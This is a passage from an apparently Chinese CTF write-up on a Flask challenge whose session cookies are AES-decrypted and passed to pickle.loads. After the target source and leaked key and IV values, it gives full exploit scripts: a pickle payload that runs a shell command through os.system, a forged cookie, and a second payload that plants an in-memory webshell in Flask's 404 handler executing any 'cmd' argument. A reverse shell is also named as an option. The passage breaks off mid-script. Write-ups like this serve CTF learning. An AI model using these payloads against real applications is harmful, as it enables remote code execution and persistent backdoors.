        padder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>padder<span class="token punctuation">(</span><span class="token punctuation">)</span>
        padded_data <span class="token operator">=</span> padder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> padder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> encryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>padded_data<span class="token punctuation">)</span> <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">'decrypt'</span><span class="token punctuation">:</span>
        decryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>
        encrypted_data_bytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        decrypted_data <span class="token operator">=</span> decryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>encrypted_data_bytes<span class="token punctuation">)</span> <span class="token operator">+</span> decryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        unpadder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>unpadder<span class="token punctuation">(</span><span class="token punctuation">)</span>
        unpadded_data <span class="token operator">=</span> unpadder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>decrypted_data<span class="token punctuation">)</span> <span class="token operator">+</span> unpadder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> unpadded_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

users <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"admin"</span><span class="token punctuation">:</span> <span class="token string">"admin123"</span><span class="token punctuation">}</span>

<span class="token keyword">def</span> <span class="token function">create_session</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    session_data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"expires"</span><span class="token punctuation">:</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">}</span>
    pickled <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_data<span class="token punctuation">)</span>
    pickled_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    key<span class="token punctuation">,</span> iv <span class="token operator">=</span> generate_key_iv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    session <span class="token operator">=</span> aes_encrypt_decrypt<span class="token punctuation">(</span>pickled_data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'encrypt'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> session

<span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"static"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data

<span class="token keyword">def</span> <span class="token function">validate_session</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        key<span class="token punctuation">,</span> iv <span class="token operator">=</span> generate_key_iv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        pickled <span class="token operator">=</span> aes_encrypt_decrypt<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'decrypt'</span><span class="token punctuation">)</span>
        pickled_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span>
        session_data <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>pickled_data<span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> session_data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        
        <span class="token keyword">return</span> session_data <span class="token keyword">if</span> session_data<span class="token punctuation">[</span><span class="token string">"expires"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">"session"</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">:</span>
        session <span class="token operator">=</span> validate_session<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">"session"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> session<span class="token punctuation">:</span>
            data <span class="token operator">=</span> <span class="token string">""</span>
            filename <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"filename"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> filename<span class="token punctuation">:</span>
                data <span class="token operator">=</span> download_file<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> name<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> file_data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> users<span class="token punctuation">.</span>get<span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">==</span> password<span class="token punctuation">:</span>
            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">,</span> create_session<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> resp
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"Invalid username or password"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    resp<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> resp

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

</code></pre>
    <p>
     可以拿到源码, 可以发现在校验cookie的时候会执行
     <code>
      pickle.loads
     </code>
     , 进行反序列化, 就是要利用这里, 所以需要伪造cookie
    </p>
    <pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">validate_session</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        key<span class="token punctuation">,</span> iv <span class="token operator">=</span> generate_key_iv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        pickled <span class="token operator">=</span> aes_encrypt_decrypt<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'decrypt'</span><span class="token punctuation">)</span>
        pickled_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span>
        session_data <span class="token operator">=</span>a pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>pickled_dta<span class="token punctuation">)</span> <span class="token comment">#漏洞点, 进行反序列化</span>
        
        <span class="token keyword">if</span> session_data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        
        <span class="token keyword">return</span> session_data <span class="token keyword">if</span> session_data<span class="token punctuation">[</span><span class="token string">"expires"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
</code></pre>
    <p>
     继续读环境变量, 可以发现
     <code>
      SECRET_key
     </code>
     ,
     <code>
      SECRET_iv
     </code>
     的值
     <br/>
     <code>
      key=ajwdopldwjdowpajdmslkmwjrfhgnbbv
     </code>
     <br/>
     <code>
      iv=asdwdggiouewhgpw
     </code>
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/981ee1a59e864d6eb4fd523a33ac8a7a.png"/>
     有了key, 那就可以伪造cookie了, 当服务器校验cookie的时候就可以触发
     <code>
      pickle.loads
     </code>
     进行反序列化, 执行恶意代码了
     <br/>
     不过没有回显, 可以尝试写文件, 反弹shell, 打内存马之类的
    </p>
    <pre><code class="prism language-python"><span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>ciphers <span class="token keyword">import</span> Cipher<span class="token punctuation">,</span> algorithms<span class="token punctuation">,</span> modes
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> padding
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> time
<span class="token keyword">import</span> os

<span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'whoami &gt; /tmp/1.txt'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">generate_key_iv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> <span class="token string">b"ajwdopldwjdowpajdmslkmwjrfhgnbbv"</span>
    iv <span class="token operator">=</span> <span class="token string">b"asdwdggiouewhgpw"</span>
    <span class="token keyword">return</span> key<span class="token punctuation">,</span> iv


<span class="token keyword">def</span> <span class="token function">aes_encrypt_decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'encrypt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    cipher <span class="token operator">=</span> Cipher<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> modes<span class="token punctuation">.</span>CBC<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">,</span> backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'encrypt'</span><span class="token punctuation">:</span>
        encryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>
        padder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>padder<span class="token punctuation">(</span><span class="token punctuation">)</span>
        padded_data <span class="token operator">=</span> padder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> padder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> encryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>padded_data<span class="token punctuation">)</span> <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">'decrypt'</span><span class="token punctuation">:</span>
        decryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>
        encrypted_data_bytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        decrypted_data <span class="token operator">=</span> decryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>encrypted_data_bytes<span class="token punctuation">)</span> <span class="token operator">+</span> decryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        unpadder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>unpadder<span class="token punctuation">(</span><span class="token punctuation">)</span>
        unpadded_data <span class="token operator">=</span> unpadder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>decrypted_data<span class="token punctuation">)</span> <span class="token operator">+</span> unpadder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> unpadded_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>


users <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"admin"</span><span class="token punctuation">:</span> <span class="token string">"admin123"</span><span class="token punctuation">}</span>

<span class="token keyword">def</span> <span class="token function">create_session</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    session_data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"expires"</span><span class="token punctuation">:</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">,</span> <span class="token string">"exp"</span><span class="token punctuation">:</span>Exploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token comment">#加上恶意代码</span>
    pickled <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_data<span class="token punctuation">)</span>
    pickled_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>pickled_data<span class="token punctuation">)</span>
    key<span class="token punctuation">,</span> iv <span class="token operator">=</span> generate_key_iv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    session <span class="token operator">=</span> aes_encrypt_decrypt<span class="token punctuation">(</span>pickled_data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'encrypt'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]session:"</span><span class="token operator">+</span>session<span class="token punctuation">)</span>
    <span class="token keyword">return</span> session


<span class="token keyword">def</span> <span class="token function">validate_session</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        key<span class="token punctuation">,</span> iv <span class="token operator">=</span> generate_key_iv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        pickled <span class="token operator">=</span> aes_encrypt_decrypt<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'decrypt'</span><span class="token punctuation">)</span>
        <span class="token comment"># print(pickled)</span>
        pickled_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span>
        <span class="token comment"># print(pickled_data)</span>
        session_data <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>pickled_data<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>session_data<span class="token punctuation">)</span>

        <span class="token keyword">if</span> session_data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>

        <span class="token keyword">return</span> session_data <span class="token keyword">if</span> session_data<span class="token punctuation">[</span><span class="token string">"expires"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>


create_session<span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>
<span class="token comment"># 3AIoDTviFKHyONegqv4u+FWzecUPuH3EsKRB1Vioy9BWo7scZqKebzY5GfXDjcWUxxwwZWo1QRVo3tmcAosqCnRWQUtPARbxkZsiGhTQSA4iu28IAZp/5LKFcdfVXji+IOTuvlcc2mjPionMqgOZ3aomjGveIS0rbYoe9nok6yTzitoe3B4tf23ltbIGKWGE</span>
</code></pre>
    <p>
     有点奇怪, 我自己本地试了一下这个cookie是可以被反序列化然后执行的, 但是靶机上一直没成功,可能没有权限还是干嘛
     <br/>
     然后又试试打内存马
    </p>
    <pre><code class="prism language-python"><span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>ciphers <span class="token keyword">import</span> Cipher<span class="token punctuation">,</span> algorithms<span class="token punctuation">,</span> modes
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> padding
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> time
<span class="token keyword">import</span> os

<span class="token keyword">class</span> <span class="token class-name">Exp</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">generate_key_iv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> <span class="token string">b"ajwdopldwjdowpajdmslkmwjrfhgnbbv"</span>
    iv <span class="token operator">=</span> <span class="token string">b"asdwdggiouewhgpw"</span>
    <span class="token keyword">return</span> key<span class="token punctuation">,</span> iv


<span class="token keyword">def</span> <span class="token function">aes_encrypt_decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'encrypt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    cipher <span class="token operator">=</span> Cipher<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> modes<span class="token punctuation">.</span>CBC<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">,</span> backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'encrypt'</span><span class="token punctuation">:</span>
        encryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>
        padder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>padder<span class="token punctuation">(</span><span class="token punctuation">)</span>
        padded_data <span class="token operator">=</span> padder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> padder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> encryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>padded_data<span class="token punctuation">)</span> <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">'decrypt'</span><span class="token punctuation">:</span>
        decryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>
        encrypted_data_bytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        decrypted_data <span class="token operator">=</span> decryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>encrypted_data_bytes<span class="token punctuation">)</span> <span class="token operator">+</span> decryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        unpadder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>unpadder<span class="token punctuation">(</span><span class="token punctuation">)</span>
        unpadded_data <span class="token operator">=</span> unpadder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>decrypted_data<span class="token punctuation">)</span> <span class="token operator">+</span> unpadder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> unpadded_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>


users <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"admin"</span><span class="token punctuation">:</span> <span class="token string">"admin123"</span><span class="token punctuation">}</span>

<span class="token keyword">def</span> <span class="token function">create_session</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    session_data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"expires"</span><span class="token punctuation">:</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">,</span><span class="token punctuation">}</span>
    pickled <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_data<span class="token punctuation">)</span>
    pickled_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>pickled_data<span class="token punctuation">)</span>
    key<span class="token punctuation">,</span> iv <span class="token operator">=</span> generate_key_iv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    session <span class="token operator">=</span> aes_encrypt_decrypt<span class="token punctuation">(</span>pickled_data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'encrypt'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]session:"</span><span class="token operator">+</span>session<span class="token punctuation">)</span>
    <span class="token keyword">return</span> session


<span class="token keyword">def</span> <span class="token function">validate_session</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        key<span class="token punctuation">,</span> iv <span class="token operator">=</span> generate_key_iv<span class="token punctuation">(</span><span class="token punctuation">)</span>
